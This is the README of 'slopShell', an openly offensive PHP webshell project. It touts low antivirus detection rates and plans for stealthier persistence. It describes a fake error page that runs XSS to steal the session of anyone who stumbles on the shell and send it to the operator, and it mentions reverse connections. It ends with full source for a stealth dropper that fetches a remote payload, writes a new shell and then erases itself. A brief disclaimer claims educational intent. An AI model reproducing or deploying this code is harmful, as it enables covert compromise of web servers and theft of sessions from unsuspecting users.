[![GitHub forks](https://img.shields.io/github/forks/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/network)
[![GitHub stars](https://img.shields.io/github/stars/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/stargazers)
[![GitHub watchers](https://img.shields.io/github/watchers/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/watchers)
[![GitHub issues](https://img.shields.io/github/issues/oldkingcone/slopShell?style=plastic)](https://github.com/oldkingcone/slopShell/issues)
[![language](https://img.shields.io/badge/language-PHP-blue?style=plastic)](https://www.php.net)
[![language](https://img.shields.io/badge/language-Powershell-blue?style=plastic)](https://docs.microsoft.com/en-us/powershell/)
[![language](https://img.shields.io/badge/language-Bash-yellow?style=plastic)](https://www.gnu.org/software/bash/)
[![BuyMeACoffee](https://img.shields.io/badge/BuyMeACoffee-Or%20Book-yellowgreen?style=plastic)](https://www.buymeacoffee.com/oldkingcone)


# slopShell
php webshell

Since I derped, and forgot to talk about usage. Here goes.

For this shell to work, you need 2 things, a victim that allows php file upload(yourself, in an educational environment) and a way to send http requests to this webshell (the client script is the 100% best way to communicate with this shell). 


Thank you for all the support the community has given, it means alot to us. Now for things that will be added to this shell, to make it even more awesome. 

 - Mutual TLS, with the ability to generate a CA on the fly(if thats possible) 
 - More refined dropper/shell itself, to ensure that the shell will not be stumbled upon for prolonged access.
 - Future edititions of this will have access to a personal database of cloud entities, its bascially a personal shodan of mine. Fee will be required for this(sorry).


Current VT Detection ratio: 2/59 (most new version)

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/fbec31525f79578305d67847183dbef7c7a64b431aef81fd59aadfbaa10461c5/detection)


Current VT Detection ratio (obfuscated version): 1/59 //This is a refined version of the slimmed down dropper. the overall file length is just under 2kb in size. Slopshell now correctly assigns a randomized useragent with a correct useragent value, that is, an actual useragent like mozilla,opera,chrome,chromium, etc.

[![Virus Total](https://www.virustotal.com/gui/images/VT_search_hash.svg)](https://www.virustotal.com/gui/file/46920e27a685d707cb82f23c6c76dd3705d6ec9c96b398828d57791bed7af059/detection)

~~__The issue with this detection happening is i have not found a viable workaround for the keyword of eval if there was no call to eval this script would be undetectable.__~~

---
# Setup

Ok, so here we go folks, there was an itch I had to write something in PHP so this is it. This webshell has a few bells and whistles, and more are added everyday. You will need a pgsql server running that you control. However you implement that is on you.

Debian: `apt install -y postgresql php php-pear python3-pip php-readline php-curl libsodium libsodium-dev && python -m pip install proxybroker --user`

RHEL Systems: `dnf -y -b install postgresql-server postgresql php php-pear python3-pip php-readline php-curl libsodium libsodium-devel && python -m pip install proxybroker --user`

WIN: `install the php msi, and make sure you have an active postgresql server that you can connect to running somewhere.`


Once you have these set up properly and can confirm that they are running. A command I would encourge using is with `pg_ctl` you can create the DB that way, or at least init it and start it. Then all the db queries will work fine.

---
## What makes this shell unique?


There are a few key features that makes this shell stand out from most others. Aside from the lack of a pretty GUI/Web interface
This shell makes use of a few things that I as an operator did notice of other shells. Firstly being the light self-defense features that are built in, and in
my opinion... offer much more protection than a prompt for credentials. 
Some of the protection features are:
 - Need of a unique user-agent in order to reach the shell
 - Use of any/all commands are sent through uniquely named cookies.
 - Ability to encrypt commands sent from the client script to the shell itself.
 - Ability to deploy a small dropper that again with unique cookie values and user agent values will protect the dropper from being "Accidentally stumbled upon". The dropper will respond in a 404 with very little returned to the user, byte length of a UUID (16 bits in length) to hide its presence,  Once the dropper is properly activated, the dropper will encrypt then delete itself.
 - If the shell itself is found, without the unique user-agent/cookie values, the shell will respond with a 500 tricking the user into thinking the script is broken or the server failed to execute the script. Driving interest away from the file itself.
 - This shell is actively developed with much more being added.

CLIFFNOTE: For the anti analysis routines, I(oldkingcone) would love to try and take credit for this idea, but I cannot in good conscience, so the inspiration came from 1 person(you know who you are, you evil genius.) whom pointed me to this repo: https://github.com/NullArray/Archivist/blob/master/logger.py#L123 


Here is the better part of this shell. If someone happens upon this shell without supplying the exact user agent string specified in the script, this shell will produce a 500 error with a fake error page then it will attempt some XSS to steal that users session information and sends it back to a handler script on your server/system. This will then attempt to store the information in a running log file. If it is unable to do so, well the backup is your logs. Once the XSS has completed, this shell will redirect the user back to the root(/) of the webserver. So, youll steal sessions if someone finds this, can even beef it up to execute commands on the server on behalf of the user, or drop a reverse shell on the users browser through Beef or another method. The possibilities are legit endless.

---
## Images of use cases

Client script usage:
![](https://github.com/oldkingcone/slopShell/blob/master/images/client_usage.png?raw=true)

Reverse Connection initiated from the client script:
![](https://github.com/oldkingcone/slopShell/blob/master/images/reverse_connection_client_script.png?raw=true)

---
## Additional

I as the maintainer, am in no way responsible for the misuse of this product. This was published for legitmate penetration testing/red teaming purposes, and/or for educational value.  Know the applicable laws in your country of residence before using this script, and do not break the law whilst using this. Thank you and have a nice day.

## Slimmed down dropper example: 
```
/* These comments are not present in the actual dropper, these are here to explain what this is doing.*/
<?php
http_response_code(404);
# pre shared values that only the operator of this shell will have. This dropper will be split into 3 parts to include system enumeration.
if (isset($_COOKIE['6e3611c0032725']) && $_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36(d9e1cee219f19c6d7c)'){
    if (isset($_POST['hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df'])){
        $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df = explode('.', unserialize(base64_decode($_COOKIE['6e3611c0032725']), ['allowed_classes' => false]));
        # Pre-shared value that only the operator has access to through the database.
        if ( hash_equals(hash_hmac('sha256', $_COOKIE['6e3611c0032725'], $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[0]), $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[1]) ){
            if (function_exists("com_create_guid") === true){
                $CDd5054278c02f = trim(com_create_guid()).PHP_EOL.PHP_EOL;
            }else{
                $70f4adfb6efefe08db = openssl_random_pseudo_bytes(16);
                $70f4adfb6efefe08db[6] = chr(ord($70f4adfb6efefe08db[6]) & 0x0f | 0x40);
                $70f4adfb6efefe08db[8] = chr(ord($70f4adfb6efefe08db[8]) & 0x3f | 0x80);
                $CDd5054278c02f = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($70f4adfb6efefe08db), 4)).PHP_EOL.PHP_EOL;
            }
            # returns our needed data back to the server, this is broken into 3 parts, the uuid, the filename of our shell/enumeration script, and if we need stealth or not.
            echo $CDd5054278c02f . "_e8a4f6f58c05"."_true".PHP_EOL;
            fputs(fopen('./e8a4f6f58c05.php', 'a+'),base64_decode(file_get_contents($hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[2])));
            foreach (file($_SERVER['SCRIPT_FILENAME']) as $line){
            # if this dropper is activated in the correct way, this portion of the script takes less than a second to complete due to the size of this script.
                fwrite(fopen($_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt($line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
            }
            # dropper routine is finished, no need to exist on the system any longer.
            fclose($_SERVER['SCRIPT_FILENAME']);
            unlink($_SERVER['SCRIPT_FILENAME']);
        }else{
            die();
        }
        die();
    }
}else{
    die();
}
```
